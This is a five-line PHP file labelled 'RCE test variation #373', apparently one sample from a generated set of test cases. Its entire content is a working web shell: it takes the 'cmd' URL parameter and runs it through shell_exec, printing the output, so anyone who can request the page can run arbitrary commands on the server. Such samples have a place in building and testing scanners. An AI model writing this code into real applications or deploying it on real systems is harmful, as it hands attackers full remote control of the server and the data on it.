<?php
// RCE test variation #373
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>